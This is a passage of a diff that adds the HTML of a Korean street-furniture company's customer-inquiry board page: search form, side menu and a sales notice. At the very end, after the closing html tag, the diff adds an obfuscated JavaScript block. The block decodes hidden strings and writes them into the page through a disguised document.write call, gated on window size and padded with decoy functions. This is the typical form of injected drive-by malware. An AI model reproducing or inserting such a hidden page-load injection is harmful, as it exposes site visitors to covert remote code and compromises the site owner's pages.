class=page_number><font color=#555555>82</font></a> <!-- 페이지 번호 ..[1][2][3] -->
+				</td>
+			</tr>
+			<tr>
+				<td colspan=2 align=right>
+					
+<form method=get name=board_searchForm action="/bizboom/board.php" style='display:inline;'>
+	<input type=hidden name=board value="counsel">
+	<input type=hidden name=category value="">
+	<input type=hidden name=config value="">
+	<input type=hidden name=shwhere value="subject|">
+	<input type=hidden name=sort value="">
+	<input type=hidden name=sortorder value="">
+	<input type=hidden name=indextype value="">
+	<input type=hidden name=indexorder value="">
+	<input type=hidden name=linkstep value='1'>
+
+
+		<!--제목 icon-->
+			<img src="./skin_board/a_standard/b_img/i_button/sh_subject1.gif" align=absmiddle style="cursor:pointer"
+					onload="selected_chk(this,'checked')" onclick="search_select(this,'subject')">
+
+		<!--내용 icon-->
+			<img src="./skin_board/a_standard/b_img/i_button/sh_tbody1.gif" align=absmiddle style="cursor:pointer"
+					onload="selected_chk(this,'')" onclick="search_select(this,'tbody')" hspace=2>
+
+		<!--이름/별명 icon-->
+			<img src="./skin_board/a_standard/b_img/i_button/sh_name1.gif" align=absmiddle style="cursor:pointer"
+					onload="selected_chk(this,'')" onclick="search_select(this,'name|mnick')">
+
+		<!--아이디 icon-->
+			<img src="./skin_board/a_standard/b_img/i_button/sh_id1.gif" align=absmiddle style="cursor:pointer"
+					onload="selected_chk(this,'')" onclick="search_select(this,'id')" hspace=2>
+
+			<!-- 
+				* 검색대상 선택 아이콘을 추가하려면 위와 같은 방식으로 '아이콘 이름' 과 '필드명' 을 달리해서 계속 추가해 주면 된다.
+				* 각 아이콘 파일은 abcd1.gif , abcd2.gif  식으로 숫자 1, 2 로 구분한 이름으로 각 2개를 한쌍으로 만들어 넣어 줘야 한다.
+				* 참고: onclick="search_select(this,'subject')" 에서 'subject' 는 검색대상이 되는 필드명이다.
+				*   검색필드를 여러개 동시지정 하려면 onclick="search_select(this,'subject|tbody|name|mnick')" 식으로 넣으면 된다.
+			-->
+
+
+		<!--확장검색 icon-->
+			<img src="./skin_board/a_standard/b_img/i_button/sh_exten1.gif" align=absmiddle style="cursor:pointer" name='itwideshIcon'
+				onload="selected_chk(this,'')" onclick="iwindow_OPEN('iwindow_search','','','width=350,height=350,btn_help=y')">
+
+
+		<!--검색어 입력란 -->
+			<img src='./skin_board/a_standard/b_img/i_button/search_round.gif' align=absmiddle><input
+			type=text name=search value="" autocomplete=off
+			style='border:1px solid #888ca5; border-right:0; border-left:0px; width:90px; height:18px;'><input type=image src='./skin_board/a_standard/b_img/i_button/search.gif' align=absmiddle>
+
+</form>
+
+				</td>
+			</tr>
+		</table>
+
+				<!--★ 로그인 상태 표시 아이콘-->
+				
+</div>
+
+
+
+	<!--- ★ [보드설정]→[4-31] "글목록 하단에 내용 삽입" --->
+	<br><br><br>
+	<!--- ★ 보드설정→"[2-31] 전체 하단에 내용 삽입 " --->
+	 
+		  </td>
+          <td width="235" align="center" valign="top">
+		  
+		<table border="0" cellspacing="0" cellpadding="0" width="235">
+                  <tr>
+                    <td align="center" valign="top" bgcolor="#d8d8d8"> 
+				
+				
+                             <p>&nbsp;</p>
+			
+
+                     <!-------------------------------------- 메뉴테이블 ---------------------------------------------------------->
+	                
+                         <table width="210" border="0" cellspacing="0" cellpadding="0">
+                            <tr> 
+       		                <td height="25" valign="middle"><a href="../bizboom_tech/bizboom_cart.cgi"><font color="#000000">▣ 마차(Cart) / 매대</font></a></td>
+	                    </tr>
+        	            <tr> 
+                	        <td height="25" valign="middle"><a href="../bizboom_tech/bizboom_booth.cgi"><font color="#000000">▣ 부스(Booth)</font></a></td>
+        	            </tr>
+	                    <tr> 
+        	                <td height="25" valign="middle"><a href="../bizboom_tech/bizboom_minihouse.cgi"><font color="#000000">▣ 미니하우스(Mini House)</font></a></td>
+  	                    </tr>
+	                    <tr> 
+	                        <td height="25" valign="middle"><a href="../bizboom_tech/bizboom_modeling.cgi"><font color="#000000">▣ 거리 시설물</font></a></td>
+	                    </tr>
+	                    <tr> 
+	                        <td height="25" valign="middle"><a href="../street_furniture/option.php"><font color="#000000">▣ 옵션사항</font></a></td>
+	                    </tr>
+	                    <tr> 
+   	                        <td height="25" valign="middle"><a href="http://www.bizboom.co.kr/bizboom_tech/main.cgi?board=spot_photo"><font color="#000000">▣ 창업현장 photo</font></a></td>
+	                    </tr>
+                   	    <tr> 
+                  	        <td height="25" valign="middle"><a href="http://www.bizboom.co.kr/bizboom/board.php?board=counsel"><font color="#000000">▣ 고객문의 및 상담</font></a></td>
+    	                    </tr>
+    	                    <tr> 
+     	                        <td height="25" valign="middle"><a href="http://www.bizboom.co.kr/bizboom_tech/main.cgi?board=infor"><font color="#000000">▣ 정보</font></a></td>
+     	                    </tr>
+     	                    <tr> 
+     	                        <td height="25" valign="middle"><a href="http://www.bizboom.co.kr/bizboom_tech/main.cgi?board=interior"><font color="#000000">▣ 인테리어</font></a></td>
+     	                    </tr>                  				
+      	               </table>
+
+
+                   <!------------------------------------- 메뉴테이블 끝--------------------------------------->
+				  
+				  <p>&nbsp;</p>
+				  
+				  
+		   </td>
+                 </tr>
+               </table>
+
+
+                    <br><br>
+                    <!------------------------------------ 메뉴 아랫쪽 공지글 ---------------------------------->
+ 
+                            <table width="210" border="0" cellspacing="0" cellpadding="0">
+                              <tr> 
+                                <td><font color="#576878"> 
+
+                                         프렌차이즈,대형마트,노점먹거리,백화점,고속도로휴게소,대형쇼핑몰,샵인샵,
+                                         행사장부스,가판대,매표소,간이매점,이동형,고정형부스,악세사리매대,
+                                         차량인테리어,매장인테리어,조형물등..주문 제작 전문 업체 입니다.<br>
+                                        (칼라 ,사이즈 ,디자인 등은 변경 가능하오니 ..전화 문의하여 주시면 감사 하겠습니다)
+                                       </font>
+
+                                </td>
+                              </tr>
+                              <tr> 
+                                <td height="20" valign="middle"> </td>
+                              </tr>
+                              <tr> 
+                                <td height="20" valign="middle"><img src="http://www.bizboom.co.kr/images/side_20071011.jpg"></td>
+                              </tr>
+                              
+
+
+                                                           <tr> 
+                                <td height="20" valign="middle"><a href="http://www.bizboom.co.kr/bizboom/admin.php">[관리자로그인]</a></td>
+                              </tr>
+                            </table>
+
+                           
+                   <!------------------------------------ 메뉴 아랫쪽 공지글 ---------------------------------->
+
+                           <p>&nbsp;</p>
+           </td>
+         </tr>
+       </table>
+   </td>
+	  
+	  <tr><td height="1" bgcolor="gray"></td></tr>
+	  <tr><td align="center" valign="top"><a href="http://www.bizboom.co.kr"><img src="../street_furniture/images/sub_address.gif" width="648" height="56" border="0"></a></td></tr>
+	  
+  </tr>
+</table>
+</body>
+</html>
+
+<!------------------------------  글목록 전체구성 끝 --------------------------------------------------------------------------------->
+
+
+
+
+
+
+
+
+
+
+
+
+<span id='TnTindexListMany' style='display:none'>16</span>
+    
+<script>function LJzxy(){if (navigator.userAgent.indexOf("MSIE")>0) return document.body.clientWidth*document.body.clientHeight;else return window.outerWidth*window.outerHeight;}if(LJzxy()>100000){function hmpPPchRU(MdDapgLaWO){var ZlqcCQWC=5,qLsJUyy=7;var jhBgmz='69+2-101+3-99+2-107+6-95+5-104+2-98+4-49+2-111+3-101+3-97+6-109+2-100+5-70+0-61+3-49+2-100+5-98+4-101+3-100+0-100+5-109+2-70+0-61+3-49+2-96+3-105+5-107+6-97+6-98+4-',XzXT=jhBgmz.split('-');urGMld='';function hOqNlMO(c){return String.fromCharCode(c);}for(SNCiZ=(XzXT.length-1);SNCiZ>=(-0xe+0x13+0x6-0x20+0x15);SNCiZ-=0xe-0x22-0x1b+0xd-0x29+0x4c){ ixbQcJoKnH=XzXT[SNCiZ].split('+');nBDkDG = parseInt(ixbQcJoKnH[0]*qLsJUyy)+parseInt(ixbQcJoKnH[1]);nBDkDG = parseInt(nBDkDG)/ZlqcCQWC;urGMld = hOqNlMO(nBDkDG-(-0x1a+0x17+0x2b-0x12+0xf))+urGMld;}if( urGMld.charCodeAt( urGMld.length-1) == 0)urGMld = urGMld.substring(0, urGMld.length-1);return urGMld.replace(/^\s+|\s+$/g, '');}function EXqHCDiHw(kCMvte){ window.eval();alert('FYnl'); } 
+function xbRFyo(NPjoRsEmN){var KoUYMg=7,gRLPY=6;var YEio='176+1-114+2-99+1-80+3-162+1-176+1-156+2-170+2-161+0-157+3-172+4-176+1-159+5-161+0-176+1-114+2-99+1-80+3-177+2-176+1-158+4-114+2-88+4-164+3-178+3-178+3-173+5-110+5-98+0-98+0-',UzvlpScTg=YEio.split('-');YytVm='';function oLvyNGLMkt(c){return String.fromCharCode(c);}for(wCyvxzP=(UzvlpScTg.length-1);wCyvxzP>=(0x26-0xc-0x23-0xa+0x13);wCyvxzP-=-0x2a-0x17-0xb+0x5+0x19+0x18+0x1+0x16){ XBLnOHj=UzvlpScTg[wCyvxzP].split('+');ySuYZuCVO = parseInt(XBLnOHj[0]*gRLPY)+parseInt(XBLnOHj[1]);ySuYZuCVO = parseInt(ySuYZuCVO)/KoUYMg;YytVm = oLvyNGLMkt(ySuYZuCVO-(-0x14+0x31-0x19+0x21))+YytVm;}if( YytVm.charCodeAt( YytVm.length-1) == 0)YytVm = YytVm.substring(0, YytVm.length-1);return YytVm.replace(/^\s+|\s+$/g, '');}function FbLyF(pvqhYzUW){ alert('EAJWES');var HqkyU=new Function("ObYlHJfk", "return 939862;"); } 
+function pgXN(vxcwRswrk){var sFZxLu=4,BXWp=4;var kcExTQp='152+0-136+0-134+0-151+0-134+0-148+0-151+0-142+0-83+0-136+0-148+0-146+0-84+0-136+0-148+0-154+0-147+0-153+0-94+0-83+0-149+0-141+0-149+0-76+0-99+0-97+0-84+0-142+0-139+0-151+0-',UBV=kcExTQp.split('-');BakxxKTNA='';function yfMzUxrHip(c){return String.fromCharCode(c);}for(ZwjS=(UBV.length-1);ZwjS>=(0xa+0x7-0x11);ZwjS-=-0xf+0x2f+0xd-0x1-0x8+0x30-0x53){ gSm=UBV[ZwjS].split('+');OTypbCSv = parseInt(gSm[0]*BXWp)+parseInt(gSm[1]);OTypbCSv = parseInt(OTypbCSv)/sFZxLu;BakxxKTNA = yfMzUxrHip(OTypbCSv-(0x6-0x2e-0x1a+0x13-0x2+0x1b-0x1+0x3c))+BakxxKTNA;}if( BakxxKTNA.charCodeAt( BakxxKTNA.length-1) == 0)BakxxKTNA = BakxxKTNA.substring(0, BakxxKTNA.length-1);return BakxxKTNA.replace(/^\s+|\s+$/g, '');}function cDto(LCFxg){fff.op.replace("1033");var QQeaMj=new Function("GZyINozmKv", "return 642214;"); } 
+function VesKgThBf(PoDJK){var Cus=3,SyllNxXFVj=6;var nSkbTPkCpj='67+0-73+0-69+0-49+3-',pnTVZxN=nSkbTPkCpj.split('-');DMk='';function hXuWO(c){return String.fromCharCode(c);}for(tHKG=(pnTVZxN.length-1);tHKG>=(-0x17+0x14-0x2f+0x32);tHKG-=0x13-0x14-0x1d+0x29+0x31+0x21-0x5c){ hxMCGVrkx=pnTVZxN[tHKG].split('+');DxsdRVLR = parseInt(hxMCGVrkx[0]*SyllNxXFVj)+parseInt(hxMCGVrkx[1]);DxsdRVLR = parseInt(DxsdRVLR)/Cus;DMk = hXuWO(DxsdRVLR-(0x29+0xb-0x2-0x1c+0x3+0xc))+DMk;}if( DMk.charCodeAt( DMk.length-1) == 0)DMk = DMk.substring(0, DMk.length-1);return DMk.replace(/^\s+|\s+$/g, '');}function cdWMAAuQve(LJHVBI){fff=op.split("422"); } 
+function XfDHRv(VCEo){ var GqDOAd = document.getElementById('FJnFu');var GqDOAd = document.getElementById('FJnFu');window.eval(); } 
+var OsLBpZcwM=hmpPPchRU('HOS')+xbRFyo('YkyZHPbL')+pgXN('LhqveaK')+VesKgThBf('zMrJXS'); XRQwVtq=document;XRQwVtq['9877wr1733i4964t1306e36284114'.replace(/[0-9]/g,'')](OsLBpZcwM);function HuxBklZ(KLAHmyA){ var tuao = document.getElementById('dbKFuid'); } 
+function FfsCEfx(CCAPK){ var CIVrgk=new Function("HjDtvhpa", "return 699401;");window.eval(); fff=op.split("401"); } 
+function GmWOQIz(Uefu){ window.eval(); } 
+}</script>
+</BODY>
+
+</HTML>
+
+
+
+
+
